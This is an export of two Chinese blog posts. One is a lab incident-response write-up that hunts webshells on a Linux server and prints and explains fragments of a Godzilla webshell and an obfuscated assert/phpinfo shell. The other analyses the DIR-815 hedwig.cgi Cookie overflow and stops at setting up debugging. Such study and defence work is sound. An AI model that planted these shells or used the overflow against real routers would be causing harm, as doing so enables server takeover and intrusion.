[{"title":"玄机靶场 第一章 应急响应-webshell查杀","url":"/2025/04/16/玄机_第一章_应急响应_webshell查杀/","content":"\n# 导言\n\n作为一个Pwn手，在经历ccb下午渗透赛只能给队友提供情绪价值去看应急响应被内核马戏耍后，~~痛定思痛,~~决定学习一些应急响应，为队友提供一些绵薄之力\n\n# 前置工具\n\n仅需**Xshell8**\n\n# Webshell应急响应\n\n## 概念\n\n首先介绍**Webshell是什么**\n\n**WebShell** 是攻击者上传到服务器的一种**恶意脚本文件**，可以像后门一样远程控制服务器，可以做到但不限于如下功能：\n\n```\n\t查看/下载/上传文件\n​\t执行命令\n​\t修改数据库\n​\t横向移动\n```\n\n​\t而其应急响应指的是在发现服务器或网站被植入WebShell（一种通过Web页面远程控制服务器的恶意脚本）后的快速处置和修复过程，其目的是**尽快阻止攻击者的进一步操作、查明入侵路径、修复漏洞并恢复系统安全状态**。\n\n## 查杀手段\n\n### 特征值搜索\n\n首先是确定文件类型，一般而言在Web中容易成为恶意脚本文件的文件后缀是`jsp,php,asp,aspx`，刚开始的时候可以从这种文件类型着手调查。\n\n然后是查找特征值，常见后门函数是`exec(),eval(),system(),assert(),base64_decode()`等，如果能查到是最好，不能的话就只能从其它方面入手\n\n### 日志搜寻\n\n​\t\n\nWebshell的执行时通常在**web日志**中留下痕迹**(不是系统日志)**，我们通常需要在海量的请求中寻找异常的操作。通常是**看哪个请求平时是GET此时却是POST**，并且返回状态码**200(成功执行)**。那这个请求路径就很有可能是Webshell，但也不能完全确定，还是得输出看看文件内容是什么\n\n```\n状态码补充\n403————被waf拦截\n404————文件不存在\n500————服务端异常\n```\n\n### 使用工具\n\n相比于人工排查，使用工具的效率显然是更加高效，这里主要就推荐两个一个是**D盾**，一个是**微步在线**的**云沙箱**\n\n<a href=\"https://www.d99net.net\" style=\"text-decoration:none; color:blue;\">D盾</a>的优势是**界面简洁、清晰明了**，最重要的是**无需网络要求**，是线下比赛的好帮手\n\n![屏幕截图 2025-04-14 135406](https://s2.loli.net/2025/04/16/jTDHuacdVOmRgCB.png)\n\n而<a href=\"https://s.threatbook.com\" style=\"text-decoration:none; color:blue;\">云沙箱</a>胜在**功能强大**，唯一的缺点是没有钞能力就只能体验，免费版每日分析有限\n\n![屏幕截图 2025-04-14 140133](https://s2.loli.net/2025/04/16/6rHIjmd8fREg5W2.png)\n\n# 解题步骤\n\n## 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n\n在Xshell中通过把**主机**改成**玄机靶场提供的IP**，端口默认**22**，输入靶机的账号密码即可成功连接靶机\n\n![image-20250416130546493](https://s2.loli.net/2025/04/16/ir78vLjP39b1TZV.png)\n\n在开始链接后，得先回到根目录，不然没有回显\n\n![image-20250416130613247](https://s2.loli.net/2025/04/16/qytvc5AfZ9mLuMQ.png)\n\nLinux根目录下各文件夹和文件的作用\n\n| 目录                             | 作用说明                                                     |\n| -------------------------------- | ------------------------------------------------------------ |\n| `/bin`                           | 存放**基本用户命令**，如 `ls`、`cp`、`mv`、`bash` 等，单用户模式下也可使用。 |\n| `/boot`                          | 启动文件目录，包含内核（如 `vmlinuz`）、引导加载器（如 `grub`）相关文件。 |\n| `/dev`                           | 设备文件目录，Linux 一切皆文件，包括磁盘（如 `/dev/sda`）、终端、USB 等。 |\n| `/etc`                           | 系统配置文件目录，如网络配置、服务配置、用户账户配置等（如 `/etc/passwd`、`/etc/hosts`）。 |\n| `/home`                          | 普通用户的家目录，如 `/home/user`。                          |\n| `/initrd.img`、`/initrd.img.old` | 初始 RAM 磁盘镜像，启动时用于加载驱动和挂载根文件系统。`*.old` 是旧版本备份。 |\n| `/lib`                           | 系统程序运行所需的基础共享库，如 libc、动态链接器等，供 `/bin` 和 `/sbin` 使用。 |\n| `/lib32`                         | 存放 32 位系统库，供兼容老旧 32 位程序使用。                 |\n| `/lib64`                         | 存放 64 位系统库，是现代系统的主流配置。                     |\n| `/libx32`                        | 用于 x32 ABI（在 64 位平台上运行的 32 位地址空间程序）的共享库（较少用）。 |\n| `/lost+found`                    | ext 文件系统下修复错误时保存“孤儿文件”的地方（`fsck` 工具用）。 |\n| `/media`                         | 可移动设备挂载点，如 USB、CD-ROM（由系统自动挂载）。         |\n| `/mnt`                           | 临时挂载点，用于手动挂载设备，如临时挂载 ISO 或远程文件系统。 |\n| `/opt`                           | 第三方应用程序安装目录（如 `/opt/google/chrome`）。          |\n| `/proc`                          | 虚拟文件系统，内核和进程信息接口，如 `/proc/cpuinfo`、`/proc/1/`。 |\n| `/root`                          | **root 用户的主目录**，区别于 `/home/root`。                 |\n| `/run`                           | 用于存放系统启动后运行时的临时文件，如 PID 文件、Socket 等（挂载于 tmpfs）。 |\n| `/sbin`                          | 系统管理员命令，如 `iptables`、`reboot`、`fsck` 等，通常不供普通用户使用。 |\n| `/srv`                           | 服务数据目录，Web、FTP 等服务可在此处放数据（如 `/srv/www/`）。 |\n| `/sys`                           | 内核虚拟文件系统，暴露设备、驱动等结构，供用户空间与内核交互。 |\n| `/tmp`                           | 临时文件目录，系统重启时可能会清空，用户和程序常用于临时写文件。 |\n| `/usr`                           | 用户程序和共享资源目录，包括大部分程序和库，如 `/usr/bin`、`/usr/lib`。 |\n| `/var`                           | 可变数据目录，如**日志**（`/var/log`）、邮件、缓存、数据库数据等。 |\n\n当然这么多文件夹一个个找是不现实的，我们得找到特定的文件，肯定需要需要借助Linux的指令取寻找特定的文件\n\n`find [路径] [行为模式] [表达式]`\n\n例如我们想查找php的危险函数，就用如下表达式\n```\nfind ./ -type f -name \"*.php\" | xargs grep \"eval(\"\n./\t\t====>\t当前目录\n-type\t====>\t指定想查找的类型\n\t\t\t\tf\t====>\t普通文件:如txt,php,elf文件等\n\t\t\t\td\t====>\t目录:如/home\n\t\t\t\tl\t====>\t符号链接:如usr/bin/python->python3\n\t\t\t\tc\t====>\t字符设备文件:/dev/tty等\n\t\t\t\tb\t====>\t块设备文件:/dev/sda(硬盘)\n\t\t\t\ts\t====>\t套接字:通信的socket文件\n\t\t\t\tp\t====>\t命名管道:管道通信中产生的特殊文件\n-name\t====>\t按照文件名进行查找(区分大小写)\n\"*.php\" ====>\t所有以php结尾的文件\n|\t\t====>\t管道符，把前一个命令的输出，作为后一个命令的输入\nxargs\t====>\t将管道中的内容转换成命令行参数\ngrep\t====>\t在文件中按关键词或正则表达式查找匹配的行，并输出这些行\n\"eval(\" ====>\t输出\"*.php\"中包含有\"eval(\"的文件路径\n```\n\n找其它类型文件的危险函数也同上\n\n如果想查询免杀马是否采用了某种编码进行隐藏，可用如下指令\n\n```\nfind ./ type f -name \"*.php\" | xargs grep \"base64_decode\" \n```\n\n经过查找，发现确实有两个webshell，但是只有一个有flag\n\n![image-20250416134007392](https://s2.loli.net/2025/04/16/ZOYRUpnsIqmFiby.png)\n\n![屏幕截图 2025-04-16 134054](https://s2.loli.net/2025/04/16/pYfuURMLIXg5V1h.png)\n\n这一串字符就是flag\n\n分析一下这个webshell做了什么吧\n\n`@session_start()`启动了会话，`@`用于抑制任何可能的错误信息输出和警告\n\n`@set_time_limit(0)`设置了时间无限，意味着该脚本可以无限时长存在\n\n`@error_reporting`禁止错误输出，更加保险\n\n```php\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n\n```\n\n以`$K`为密钥将`$D`进行数据加密，隐藏恶意输入的内容\n\n`$payloadName='payload'`定义一个常量，表示存储恶意输入的会话的键名\n\n`$key='3c6e0b8a9c15224a'`密钥\n\n`$data=file_get_contents(\"php://input\")`获取`php://input`流数据\n\n```php\nif ($data!==false){\n\t$data=encode($data,$key);\n```\n\n如果data是否成功读取了数据，成功就**通过key进行加密**\n\n```php\nif (isset($_SESSION[$payloadName])){  \n    $payload=encode($_SESSION[$payloadName],$key);\n    if (strpos($payload,\"getBasicsInfo\")===false){\n        $payload=encode($payload,$key); \n    }\n    eval($payload);\n    echo encode(@run($data),$key);\n```\n\n首先**检查会话中是否有payloadName**，若存在就将payload再通过key加密，然后检测payload的加密数据中是否存在`getBasicsInfo`，若不存在，就再次加密，然后再执行payload中的字符串\n\n`@run($data)`会尝试执行data中的命令，然后通过key加密再echo出，这样可以隐藏返回数据，使恶意代码不易被查看\n\n```php\n}else{\n    if (strpos($data,\"getBasicsInfo\")!==false){\n        $_SESSION[$payloadName]=encode($data,$key);\n    }\n}\n```\n\n若是**会话中不存在payloadName**，则会直接检查流数据中是否存在`getBasicsInfo`，若存在，则会将加密后的data数据存储如会话中，便于再后续请求中继续利用该恶意代码\n\n## 黑客使用的什么工具的shell github地址的md5 flag{md5}\n\n将这些代码直接丢进安恒云沙箱里，这个可以检测出是什么类型的病毒，方便我们找flag\n\n![image-20250416154210061](https://s2.loli.net/2025/04/16/9NB3pZDK5nthagW.png)\n\n![屏幕截图 2025-04-16 140403](https://s2.loli.net/2025/04/16/2G8RNdZWaeE3tcx.png)\n\n确定是哥斯拉木马，只需要找它的github项目地址就行，网上一搜有好些，最终找到如下\n\n````\nhttps://github.com/BeichenDream/Godzilla\n````\n\n再md5一下就好\n\n## 黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\n\n题目明说了是隐藏，所以**无法直接ls查询到**，寻找隐藏文件的指令如下\n\n```\nls -al\n-a\t显示所有文件，包括以 . 开头的隐藏文件\n-l 以长表格显示，包含权限、所有者、大小、修改时间等信息\n```\n\n不过其实我们在最开始的时候就找到了，就是**.Mysqli.php**文件，路径如下\n\n![屏幕截图 2025-04-09 201354](https://s2.loli.net/2025/04/16/L2mGrCsEJtx6V7K.png)\n\n```\n/var/www/html/include/Db/.Mysqli.php\n```\n\n## 黑客免杀马完整路径 md5 flag{md5}\n\n既然是免杀马，那就说明我们无法通过特征值搜索直接得到，它肯定做了些混淆、拼接等操作，例如base加密，异或操作等，我们无法直接通过`find`来寻找它，这种情况下，我们一般能够采取的办法就是看日志，**web日志**\n\nLinux存储日志的路径一般为`/var/log`，扩展名为`log`\n\n**Linux常见日志文件**\n\n| 文件名                        | 作用说明                                   |\n| ----------------------------- | ------------------------------------------ |\n| `/var/log/syslog`             | 系统日志（Debian/Ubuntu 常见）             |\n| `/var/log/messages`           | 系统日志（CentOS/RedHat 常见）             |\n| `/var/log/auth.log`           | 身份验证相关日志（如 SSH 登录）            |\n| `/var/log/secure`             | 类似于 `auth.log`，但在 RedHat 系常见      |\n| `/var/log/kern.log`           | 内核级日志                                 |\n| `/var/log/dmesg`              | 内核启动日志                               |\n| `/var/log/boot.log`           | 开机启动日志                               |\n| `/var/log/httpd/access_log`   | Apache HTTP 访问日志（CentOS）             |\n| `/var/log/apache2/access.log` | Apache 日志（Debian）                      |\n| `/var/log/nginx/access.log`   | Nginx 访问日志                             |\n| `/var/log/lastlog`            | 用户登录记录（用 `lastlog` 命令查看）      |\n| `/var/log/faillog`            | 登录失败记录（用 `faillog` 查看）          |\n| `/var/log/btmp`               | 登录失败记录（需用 `lastb` 查看）          |\n| `/var/log/wtmp`               | 所有用户登录登出记录（用 `last` 命令查看） |\n\nWindows存储日志的路径一般为`C:\\Windows\\System32\\winevt\\Logs\\`，扩展名为`evtx`\n\n**Windows常见日志文件**\n\n| 文件名                                | 说明                     |\n| ------------------------------------- | ------------------------ |\n| `System.evtx`                         | 系统日志                 |\n| `Application.evtx`                    | 应用程序运行日志         |\n| `Security.evtx`                       | 安全日志（登录、权限等） |\n| `Setup.evtx`                          | 安装更新相关日志         |\n| `Windows PowerShell.evtx`             | PowerShell 使用日志      |\n| `Microsoft-Windows-WMI-Activity.evtx` | WMI 活动日志             |\n\n我们先查看`/var/log`里有什么\n\n![image-20250416191744990](https://s2.loli.net/2025/04/16/mfODByuN3RrS5FX.png)\n\n已知我们是webshell，所以不在系统日志里找，得在web日志里，而我们又看到了`apache2`，就很可能在apache(最流行的 Web 服务器之一)里的日志里有免杀马的信息\n\n![](https://s2.loli.net/2025/04/16/V1JSlyROCokLeUE.png)\n\n我们直接看`access.log`，发现有几个可疑请求\n\n![image-20250416192415812](https://s2.loli.net/2025/04/16/JLwD6VumYc8S1b2.png)\n\n![image-20250416192508676](https://s2.loli.net/2025/04/16/4EzbogjXQYDprIk.png)\n\n![image-20250416192523618](https://s2.loli.net/2025/04/16/hGPE9poMfe54mHg.png)\n\n我们先看`/data/tplcache/top.php`\n\n![image-20250416192706225](https://s2.loli.net/2025/04/16/M15yajiH8VORPz7.png)\n\n看起来是个很正常的php代码，是一个管理系统，那我们看下一个`/wap/top.php`\n\n![image-20250416193056445](https://s2.loli.net/2025/04/16/qdwuLa6etZj27iy.png)\n\n我们来解析这串代码\n\n`<?php`是php代码的标准开头\n\n`$key = \"password\"`定义了一个密钥\n\n`$fun = base64_decode($_GET['func'])`请求fuc的资源并进行base64解码(ERsDHgEUC1hI)，将解码内容赋值给fun。<u>不过我很好奇为什么日志里是fuc才拥有这串字符串，可仍然能请求资源成功</u>\n\n```php\nfor($i=0;$i<strlen($fun);$i++){\n    $fun[$i] = $fun[$i]^$key[$i+1&7];\n}\n```\n\n进行异或操作，算是将混淆的内容进行解密，解密内容是`phpinfo()`\n\n`$c = $a . $s . $_GET[\"func2\"]`定义一个c进行字符串拼接将**a、s、func2的内容进行依次拼接**，成为`assert`\n\n`$c($fun)`等价于`assert(phpinfo())`\n\n很明显，这个就是那个免杀马，为什么呢？**我们得先了解assert()函数和phpinfo()函数**\n\n`assert`原本用于**调试**代码，接受一个表达式并判断是否为真，但自从某个版本之后，**如果往assert()里输入字符串，那么assert()就会被当成是eval()执行**，而**eval()会把字符串当作是php代码**，从而执行任意代码\n\n`phpinfo`函数会输出完整的php环境信息，包括但不限于**php版本，环境变量，http头，COOKIE等**，很容易造成信息泄露\n\n所以执行链如下\n\n```php\nassert(\"phpinfo()\")--->eval(\"phpinfo()\")--->phpinfo()\n```\n\n直接造成信息泄露，从而更好植入别的木马\n\n免杀马路径`/var/www/html/wap/top.php`\n","categories":["应急响应"]},{"title":"DIR-815","url":"/2024/11/25/DIR-815/","content":"\n# 前置条件：\n\n## 工具：\n\n建议Ubuntu18.04及以上且**是纯净版本**\n\n### binwalk\n\n``sudo apt install binawlk``\n\n### firmware-mod-kit\n\n安装之前得先安装环境\n\nUbuntu18.04及前\n\n``sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic autoconf``\n\nUbuntu20.04及后\n\n``sudo apt-get install git build-essential zlib1g-dev liblzma-dev python3-magic autoconf python-is-python3``\n\n环境配好后就可以安装firmware-mod-kit了\n\n``git clone https://github.com/rampageX/firmware-mod-kit.git``\n\n### FirmAE\n\n**强烈建议拉项目前存个快照**\n\n拉项目\n\n``git clone --recursive https://github.com/pr0v3rbs/FirmAE``\n\n之后进入文件夹依次执行以下三个``sh``文件\n\n```\nsudo ./download.sh\nsudo ./install.sh\nsudo ./init.sh\n```\n\n#### 常见问题\n\n##### download.sh\n\ndownload里的网站基本全在海外，所以常常出现没法全部拉下来的场面\n\n我的建议是，要么走**代理**\n\n要么就**把sh文件里的网站复制下来在宿主机里的浏览器中下载**，也就是亲力亲为一个个下，再**复制粘贴到binaries**\n\n##### install.sh\n\n跑之前给点建议：\n\n1.如果你有qemu环境，就**注释掉sh里的以下代码**，否则很有可能将你的qemu环境弄得一团糟\n\n```\nsudo apt-get install -y qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils\n```\n\n2.网络问题是典中典，建议**走代理**\n\n3.这玩意会给你安一个**postgresql**,小心环境紊乱\n\n```\nsudo apt install -y postgresql\n```\n\n综上：\n\n​\t如果你执行完它再重启Ubuntu后，失去了图形化界面，那就是没救了，**回快照**吧，环境崩了\n\n#### 使用仿真常见小问题\n\n##### ``target is busy.``\n\n这玩意基本就是因为没有正常退出仿真导致的\n\n查看挂载点\n\n命令：``mount | grep pathto/FirmAE/scratch/targetID/image``\n\n删掉挂载点\n\n命令：``sudo umount -f pathto/FirmAE/scratch/targetID/image``\n\n​\t or   ``sudo umount --lazy pathto/FirmAE/scratch/1/image``（可以两个指令联用）\n\n有时候这玩意会抽风，得尝试好几次，不知道啥原因\n\n##### ``Address already in use``\n\n成因同上\n\n删除占用端口\n\n命令：先查看``sudo lsof -i -P -n | grep LISTEN``\n\n​\t\t\t后删除``sudo kill -9 <PID>``\n\n### IDA的mipsrop插件\n\n旧一点的IDAPython的版本一般是python2版本，并且mipsrop.py脚本也是按照python2格式来写的，这就导致你如果IDAPython的版本高于3，就会有mipsrop.py脚本不适配，得一个个修改，甚至修改了还是运行不了，还好网上有大佬已经弄好适配python3版本的mipsrop.py了，但我自己搜的时候弄的好痛苦，基本都是介绍python2 的版本，很麻烦，所以我把该链接分享出来\n\n[[求助\\]IDA 无法安装mipsrop插件-求助问答-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-266102.htm)\n\n需要下载的zip包就在评论区里，往下滑很快的，经本人亲自尝试，可支持IDA8.3甚至是IDAPro9.0\n\n解压后直接把以下文件丢到IDA根目录下的plugins即可\n\n![image-20241125212843749](https://s2.loli.net/2024/11/25/nlSzaiYCTjcx6Wq.png)\n\n#### 常见问题：**NameError: name 'mipsrop' is not defined**\n\n解决方法\n\n```python\nimport mipsrop\nmipsrop = mipsrop.MIPSROPFinder()\n```\n\n#### 常使用模块\n\n寻找特定gadget\n\n``mipsrop.find(\"the asm you want to search\")``\n\n主要针对栈相关的gadget\n``mipsrop.stackfinders()``\n\n\n\n## 知识点：\n\n### 基础溢出\n\n有点Pwn基础的上手会很快，简单解释下什么是溢出。一般都是由于**缓冲区溢出**等原因导致攻击者能够**控制程序执行流**，来**执行恶意代码**，达到攻击目的。在这就是对路由器进行挟持了。\n\n常见的攻击方式有``Shellcode``和``ROP``\n\n#### Shellcode\n\nShellcode的本质是**机械码**，攻击者通过精心构建的Shellcode，来执行恶意代码，最终达到攻击目的。一般的Shellcode由**汇编**辅助编写而成，所以常见的都是用汇编写Shellcode\n\n#### ROP\n\n``ROP``即返回导向编程。通过利用程序中各种**细碎的代码段**(也称为``gadget``如``pop | ret``)串成一段恶意代码，这段恶意代码有着**控制寄存器、系统调用**等功能，通过溢出劫持返回地址执行这段代码，达到攻击目的\n\n### HTTP协议\n\n有web基础基本就可以跳了，简要介绍下\n\nHTTP(即HyperText Transfer Protocol)是一种**超文本传输协议**，是Web上进行任何数据交换的基础，也是一种**客户端-服务器**协议.\n\n它由**请求和响应**组成，而请求的各个部分分别是**请求行、消息报头、请求正文**。\n\n##### 请求行\n\n``Method Request-URI HTTP-Version CRLF``\n\n##### 消息报头\n\n包含若干字段，通常以 `key: value` 的格式表示，如\n\n```\nContent-Length: 348\nContent-Type: application/x-www-form-urlencoded\n```\n\n##### 请求正文\n\nHTTP请求正文是请求消息中可选的部分，通常用于在 `POST`、`PUT` 或其他需要传递数据的请求中，携带客户端向服务器发送的数据。它是位于请求头之后的实际数据内容。可由多种数据组成，如表单、二进制、JSON等，如\n\n```\nPOST /api/v1/user HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\nContent-Length: 55\n\n{\n  \"username\": \"admin\",\n  \"password\": \"12345\",\n  \"remember_me\": true\n}\n```\n\n``Content-Type``来判断请求正文的格式，JSON格式的内容则是请求正文\n\n### MIPS架构\n\n#### 寄存器\n\n```\nzero -> 值始终为0\n$at -> 保留给汇编器\n$v0-$v1 -> 保存表达式返回结果\n$a0-$v3 -> 函数参数，类比rdi,rsi...的顺序，超过4个则用堆栈传递\n$t0-t9 -> 临时寄存器，其中t8,t9是扩展，且t9常用来调用函数\n$s0-$s7 -> 保存寄存器，保存一些函数调用时必要的值\n$k0-$k1 -> 留给系统中断处理的时候使用\n$gp -> 全局指针\n$sp -> 堆栈指针，类比rsp\n$fp -> 栈帧指针\n$ra -> 返回地址，类比ret\n```\n\n#### 基础汇编\n\n##### LOAD和STORE\n\n```\nl==>LOAD\ns==>STORE\n不同的后缀代表不同的数据大小\nw==>word\nh==>half\nb==>byte\nu==>unsigned\ni==>immediate\n```\n\n##### 指令格式\n\n###### R型\n\n`` opcode | first source res | second source res | destination res | offset | funct(这个参数不用了解，毕竟我们看的常常是汇编) ``\n\n###### I型\n\n`` opcode | source res | destination res | addr_offset``\n\n###### J型\n\n``opcode | target_addr``\n\n##### 常见汇编\n\n```\nadd\njr==jmp，常跟ra\njalr，效果近似于jmp，后边常跟t9调用函数\n```\n\n#### 流水线指令集特性之一：分支延迟效应\n\n**流水线效应**最常见的就是跳转指令（如`jalr`）导致的**分支延迟效应**，当它跳转指令填充好跳转地址但尚未跳转过去时，它会优先执行该跳转指令的下一条指令，如\n\n```\njalr    $t9\naddiu   $s0, 1\n```\n\n**在还未跳转到t9时，会执行addiu汇编，然后再进行跳转**，可以理解为同时执行了两条指令\n\n\n\n\n\n## 硬件下载地址：\n\n`https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/`\n\n# 漏洞成因：\n\n![image-20241117132347511](https://s2.loli.net/2024/11/17/ao6jsVUKHCxEweT.png)\n\n**Cookie头**的``hedwig.cgi``远程缓冲区溢出\n\n# 漏洞分析：\n\n我们先从固件包下手\n\n``binwalk -Me DIR-815-FW-1.01b14_1.01b14.bin``\n\n获得以下文件\n\n![image-20241125023313081](https://s2.loli.net/2024/11/25/lSZsvrNK4FkDA9d.png)\n\n根据漏洞报告里说与``hedwig.cgi``和``Cookie``有关，我们从固件里**提取出相关二进制文件**，并就着``Cookie``进行寻找\n\n![image-20241125023442283](https://s2.loli.net/2024/11/25/qsF32ANrUjP9gbX.png)\n\n![image-20241125023510381](https://s2.loli.net/2024/11/25/dpS8Jkhf3ulmIjY.png)\n\n在``sess_get_uid``函数里发现了利用，我们先在**交叉引用中寻找与漏洞名有关的函数**\t 发现在``hedwigcgi_main``函数中进行了调用，进入该函数看看做了什么\n\n```C\nint hedwigcgi_main()\n{\n  char *v0; // $v0\n  const char *v1; // $a1\n  FILE *v2; // $s0\n  int v3; // $fp\n  int v4; // $s5\n  int v5; // $v0\n  const char *string; // $v0\n  FILE *v7; // $s2\n  int v8; // $v0\n  int v9; // $s7\n  int v10; // $v0\n  char **v11; // $s1\n  int i; // $s3\n  char *v13; // $v0\n  const char **v14; // $s1\n  int v15; // $s0\n  char *v16; // $v0\n  const char **v17; // $s1\n  int v18; // $s0\n  int v19; // $v0\n  const char *v20; // $v0\n  char v22[20]; // [sp+18h] [-4A8h] BYREF\n  char *v23; // [sp+2Ch] [-494h] BYREF\n  char *v24; // [sp+30h] [-490h]\n  _DWORD v25[3]; // [sp+34h] [-48Ch] BYREF\n  char v26[128]; // [sp+40h] [-480h] BYREF\n  char v27[1024]; // [sp+C0h] [-400h] BYREF\n\n  memset(v27, 0, sizeof(v27));\n  memset(v26, 0, sizeof(v26));\n  strcpy(v22, \"/runtime/session\");\n  v0 = getenv(\"REQUEST_METHOD\");\n  if ( !v0 )\n  {\n    v1 = \"no REQUEST\";\nLABEL_7:\n    v3 = 0;\n    v4 = 0;\nLABEL_34:\n    v9 = -1;\n    goto LABEL_25;\n  }\n  if ( strcasecmp(v0, \"POST\") )\n  {\n    v1 = \"unsupported HTTP request\";\n    goto LABEL_7;\n  }\n  cgibin_parse_request(sub_409A6C, 0, 0x20000);\n  v2 = fopen(\"/etc/config/image_sign\", \"r\");\n  if ( !fgets(v26, 128, v2) )\n  {\n    v1 = \"unable to read signature!\";\n    goto LABEL_7;\n  }\n  fclose(v2);\n  cgibin_reatwhite(v26);\n  v4 = sobj_new();\n  v5 = sobj_new();\n  v3 = v5;\n  if ( !v4 || !v5 )\n  {\n    v1 = \"unable to allocate string object\";\n    goto LABEL_34;\n  }\n  sess_get_uid(v4);\n  string = (const char *)sobj_get_string(v4);\n  sprintf(v27, \"%s/%s/postxml\", \"/runtime/session\", string);\n  xmldbc_del(0, 0, v27);\n  v7 = fopen(\"/var/tmp/temp.xml\", \"w\");\n  if ( !v7 )\n  {\n    v1 = \"unable to open temp file.\";\n    goto LABEL_34;\n  }\n  if ( !haystack )\n  {\n    v1 = \"no xml data.\";\n    goto LABEL_34;\n  }\n  v8 = fileno(v7);\n  v9 = lockf(v8, 3, 0);\n  if ( v9 < 0 )\n  {\n    printf(\n      \"HTTP/1.1 200 OK\\r\\nContent-Type: text/xml\\r\\n\\r\\n<hedwig><result>BUSY</result><message>%s</message></hedwig>\",\n      0);\n    v9 = 0;\n    goto LABEL_26;\n  }\n  v10 = fileno(v7);\n  lockf(v10, 1, 0);\n  v23 = v26;\n  v24 = 0;\n  memset(v25, 0, sizeof(v25));\n  v24 = strtok(v22, \"/\");\n  v11 = (char **)v25;\n  for ( i = 2; ; ++i )\n  {\n    v13 = strtok(0, \"/\");\n    *v11++ = v13;\n    if ( !v13 )\n      break;\n  }\n  (&v23)[i] = (char *)sobj_get_string(v4);\n  fputs(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\", v7);\n  v14 = (const char **)&v23;\n  v15 = 0;\n  do\n  {\n    ++v15;\n    fprintf(v7, \"<%s>\\n\", *v14++);\n  }\n  while ( v15 < i + 1 );\n  v16 = strstr(haystack, \"<postxml>\");\n  fprintf(v7, \"%s\\n\", v16);\n  v17 = (const char **)&(&v23)[i];\n  v18 = i + 1;\n  do\n  {\n    --v18;\n    fprintf(v7, \"</%s>\\n\", *v17--);\n  }\n  while ( v18 > 0 );\n  fflush(v7);\n  xmldbc_read(0, 2, \"/var/tmp/temp.xml\");\n  v19 = fileno(v7);\n  lockf(v19, 0, 0);\n  fclose(v7);\n  remove(\"/var/tmp/temp.xml\");\n  v20 = (const char *)sobj_get_string(v4);\n  sprintf(v27, \"/htdocs/webinc/fatlady.php\\nprefix=%s/%s\", \"/runtime/session\", v20);\n  xmldbc_ephp(0, 0, v27, stdout);\n  if ( v9 )\n  {\n    v1 = 0;\nLABEL_25:\n    printf(\n      \"HTTP/1.1 200 OK\\r\\nContent-Type: text/xml\\r\\n\\r\\n<hedwig><result>FAILED</result><message>%s</message></hedwig>\",\n      v1);\n  }\nLABEL_26:\n  if ( haystack )\n    free(haystack);\n  if ( v3 )\n    sobj_del(v3);\n  if ( v4 )\n    sobj_del(v4);\n  return v9;\n}\n```\n\n可以很明显看到漏洞点\n\n```\n  sess_get_uid(v4);\n  string = (const char *)sobj_get_string(v4);\n  sprintf(v27, \"%s/%s/postxml\", \"/runtime/session\", string);\n```\n\n``string``**过大会导致栈溢出**，而string由sobj_get_string这个函数提取v4的字符串所得，v4又由sess_get_uid进行了操作，那我们就要详细分析sess_get_uid\n\n```C\nint __fastcall sess_get_uid(int a1)\n{\n  int v2; // $s2\n  char *v3; // $v0\n  int v4; // $s3\n  char *v5; // $s4\n  int v6; // $s1\n  int v7; // $s0\n  char *string; // $v0\n  int result; // $v0\n\n  v2 = sobj_new();\n  v4 = sobj_new();\n  v3 = getenv(\"HTTP_COOKIE\");\n  if ( !v2 )\n    goto LABEL_27;\n  if ( !v4 )\n    goto LABEL_27;\n  v5 = v3;\n  if ( !v3 )\n    goto LABEL_27;\n  v6 = 0;\n  while ( 1 )\n  {\n    v7 = *v5;\n    if ( !*v5 )\n      break;\n    if ( v6 == 1 )\n      goto LABEL_11;\n    if ( v6 < 2 )\n    {\n      if ( v7 == 32 )\n        goto LABEL_18;\n      sobj_free(v2);\n      sobj_free(v4);\nLABEL_11:\n      if ( v7 == 59 )\n      {\n        v6 = 0;\n      }\n      else\n      {\n        v6 = 2;\n        if ( v7 != 61 )\n        {\n          sobj_add_char(v2, v7);\n          v6 = 1;\n        }\n      }\n      goto LABEL_18;\n    }\n    if ( v6 == 2 )\n    {\n      if ( v7 == 59 )\n      {\n        v6 = 3;\n        goto LABEL_18;\n      }\n      sobj_add_char(v4, *v5++);\n    }\n    else\n    {\n      v6 = 0;\n      if ( !sobj_strcmp(v2, \"uid\") )\n        goto LABEL_21;\nLABEL_18:\n      ++v5;\n    }\n  }\n  if ( !sobj_strcmp(v2, \"uid\") )\n  {\nLABEL_21:\n    string = (char *)sobj_get_string(v4);\n    goto LABEL_22;\n  }\nLABEL_27:\n  string = getenv(\"REMOTE_ADDR\");\nLABEL_22:\n  result = sobj_add_string(a1, string);\n  if ( v2 )\n    result = sobj_del(v2);\n  if ( v4 )\n    return sobj_del(v4);\n  return result;\n}\n```\n\n总结就是该函数经过了一系列操作中，从 HTTP 请求的 Cookie 中解析键为 `\"uid\"` 的值，并将其存储到目标对象``v4``中，如果没有找到 `\"uid\"`，则使用客户端的 IP 地址作为默认值，所以payload的格式很好确定\n\n```json\n'Cookie':'uid='+ payload\n```\n\n# 动态调试\n\n## 启动仿真\n\n``path_to_FirmAE/run.sh <mode> <brand> path/to/firmware``\n\nmode是模式，brand是品牌，比如我是这样的\n\n``./run.sh -d dlink /home/dusk/firmware/DIR-815_REVA_FIRMWARE_v1.01/dir815_FW_101/DIR-815-FW-1.01b14_1.01b14.bin``\n\n等待一会儿后就会出现如下界面\n\n![image-20241125030219067](https://s2.loli.net/2024/11/25/AMxVGf8a3FmzreQ.png)\n\n我们先输入2，输入指令，获取服务进程\n\n``ps | grep \"httpd\"``\n\n![image-20241125030315819](https://s2.loli.net/2024/11/25/1ebxOmzDNsXRn3F.png)\n\n其中2639就是我们的进程\n\n我们再``ctrl D``并输入4起gdbserver，**输入pid**即可\n\n![image-20241125030425554](https://s2.loli.net/2024/11/25/KJ7BYrcnCQsTzui.png)\n\n为了方便我们调试gdbserver，要关闭地址随机化（实际上的固件的地址也是不随机的）\n\n``echo \"0\" >> /proc/sys/kernel/randomize_va_space``\n\n因为在gdb-muliarch调试远端gdbserver的时候是没有libc模块的，所以**得在qemu里获取libc_base**\n\n``cat /proc/server_pid/maps``\n\n## 